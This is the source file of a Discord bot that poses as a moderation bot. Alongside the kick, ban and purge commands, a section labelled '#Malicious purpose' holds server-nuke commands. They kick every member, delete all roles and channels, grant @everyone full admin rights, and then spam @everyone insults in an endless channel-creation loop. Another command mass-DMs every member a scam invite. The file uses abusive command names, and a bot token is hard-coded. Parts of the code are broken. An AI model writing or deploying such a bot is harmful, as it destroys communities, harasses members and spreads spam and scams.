import discord
from discord.ext import commands
from discord.ext.commands import Bot
import asyncio
import random
import time
import logging
import threading
import os, sys
import colorama
from colorama import Fore, Back, Style

client = commands.Bot(command_prefix='1!') #This Is The Prefix, Feel Free To Change It Anytime

client.remove_command("help")

rolelist = []


def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)


@client.event #ready
async def on_ready():
    print('Servers connected to:')
    for guild in client.guilds:
        print(guild.name)


@client.event
async def on_server_join(server):
    print("Joining {0}".format(server.name))

@client.command(pass_context=True)
async def help(ctx):
    author = ctx.message.author

    embed = discord.Embed(
        colour = discord.Colour.blue()
    )

    embed.set_author(name='help')
    embed.add_field(name='$ping', value='Gives ping to client (expressed in ms)', inline=False)
    embed.add_field(name='$kick', value='Kicks specified user', inline=False)
    embed.add_field(name='$ban', value='Bans specified user', inline=False)
    embed.add_field(name='$info', value='Gives information of a user', inline=False)
    embed.add_field(name='$invite', value='Returns invite link of the client', inline=False)
    embed.add_field(name='$clear', value='Clears an X amount of messages', inline=False)
    await client.send_message(author, embed=embed)

@client.command(pass_context=True)
async def dm(ctx, message):
    server = ctx.message.server
    for member in server.members:
     await asyncio.sleep(0)
     try:
       await client.send_message(member, "https://discord.gg/sujRrDX Join now for a cheap unlimited account generator!!")
       print("Sent message")
     except:
       pass

@client.command(aliases=["Purge", "purge", "Clear"])
async def clear(ctx, amount=100):
    # the amount value is the maximum you want to delete, and also the default
    if ctx.message.author.permissions_in(ctx.message.channel).manage_messages:
         await ctx.channel.purge(limit=amount + 1)
         Colors = random.randint(50, 15_000_000)
         embed = discord.Embed(
            title=f"Channel has been purged of {amount} of message(s)", colour=Colors)
         await ctx.send(embed=embed)
    else:
        await ctx.send("Bro you don't have the permissions to do this")

@client.command(pass_context=True)
async def ping(ctx):
	channel = ctx.message.channel
	t1 = time.perf_counter()
	await client.send_typing(channel)
	t2 = time.perf_counter()
	embed=discord.Embed(title=None, description='Ping: {}'.format(round((t2-t1)*1000)), color=0x2874A6)
	await client.say(embed=embed)

@client.command(pass_context=True)
async def info(ctx, user: discord.Member=None):
    if user is None:
        await client.say('Please input a user.')
    else:
        await client.say("The user's name is: {}".format(user.name) + "\nThe user's ID is: {}".format(user.id) + "\nThe user's current status is: {}".format(user.status) + "\nThe user's highest role is: {}".format(user.top_role) + "\nThe user joined at: {}".format(user.joined_at))

@client.command(pass_context=True)
async def kick(ctx, user: discord.Member=None):
    author = ctx.message.author
    if author.server_permissions.kick_members:
        if user is None:
            await client.say('Please input a user.')
        else:
            await client.say (":boot: Get kicked **{}**, Damn kid".format(user.name))
            await client.kick(user)
    else:
        await client.say('You lack permission to preform this action')

@client.command()
async def ban(ctx, member: discord.Member, *, reason=None):
    global embed
    if ctx.message.author.permissions_in(ctx.message.channel).manage_messages:
        embed = discord.Embed(
            title="Banned",
            colour=0x2859B8,
            description=f"{member.mention} has been Banned. :joy:")
        await member.ban(reason=reason)
        await ctx.send(embed=embed)

@client.command(pass_context=True)
async def invite(ctx):
    await ctx.send("https://discordapp.com/oauth2/authorize?&client_id=503182818667659274&scope=client&permissions=8")

#Malicious purpose

async def delete_all_roles(guild):
    deleted = 0
    for role in guild.roles:
        try:
            delete_roles = await delete_all_roles()
            await role.delete()
            print(f'{m}Delete Roles:{b}{delete_roles}')
            deleted += 1
        except:
            continue
    return deleted


@client.command(pass_context=True)
async def h(ctx):
        for user in list(ctx.guild.members):
            try:
                await client.kick(user)
                print ("User " + user.name + " has been kicked from " + ctx.message.server.name)
            except:
                pass
        print ("Action Completed: kall")
Spams = ["Nuked", "Fucked", "Shoulda listened", "Goddamn clown", "Nerrddd", "DUMBASSSSS", "Get ran",
        "You kinda beamed yourself", 
        "You did this to yourself bro"]

async def Rolez(ctx):
    print(TGREEN + '''#########################
   Loop has been initiated \n #########################
    ''')
    for roles in ctx.guild.roles:
        try:
            await roles.delete(reason = "Heckedddd")
            print(f"<<{Fore.BLUE}Deleted role {roles}>>")
        except Exception:
            print(f"##{Fore.RED}couldnt delete {roles}##")

Rolzz = ["hacked xd", "Get fucked", "Big L", "Shoulda listened", "dumbass"]

amount = 500

ENDC = '\033[m' # reset to the defaults
TGREEN =  '\033[32m' # Green Text

@client.command(pass_context=True, aliases=["Rape", "fuck", "Fuck"])
async def rape(ctx):
    num = 0
    await Rolez(ctx)
    guild = ctx.guild
    role = discord.utils.get(guild.roles, name="@everyone")
    try:
        await role.edit(permissions = discord.Permissions.all())
        print(Fore.MAGENTA + "I have given everyone admin" + Fore.RESET)
    except:
        print(Fore.GREEN + "I was unable to give everone admin" + Fore.RESET)
    for channel in guild.text_channels:
        try:
            link = await channel.create_invite(max_age = 99999, max_uses = 0)
            print("I have spammed invites")
        except:
            print("Link spamming has failed")
    for channels in ctx.guild.channels:
        try:
            await channels.delete(reason = "Fuck you")
            print(f"<<{Fore.BLUE}Deleted channel {channels}>>")
        except Exception:
            print(f"##{Fore.RED}Couldnt delete {channels}##")
    time.sleep(2)
    while True:
        server = ctx.message.guild
        chnl = await ctx.guild.create_text_channel(name = "fuck yall")
        print(f"<<{Fore.BLUE}Created channel {chnl}>>")
        await chnl.send(f"@everyone {random.choice(Spams)}")
        await asyncio.sleep(0.1)
        await chnl.send(f"@everyone {random.choice(Spams)}")
        await chnl.send(f"@everyone {random.choice(Spams)}")
        await chnl.send(f"@everyone {random.choice(Spams)}")
        await chnl.send(f"@everyone {random.choice(Spams)}")

@commands.command(aliases = ["restart"])
@commands.is_owner()
async def stop(ctx):
    await ctx.author.send("Bot stopped/restarted.")
    restart_program()

client.run("ODcxODMyMTIzNjY4MDU4MTMz.YQhC8A.X7hlYKHyVRhxZZrqH5PZQZM3cFE")
#Bot's Token Code Goes Here
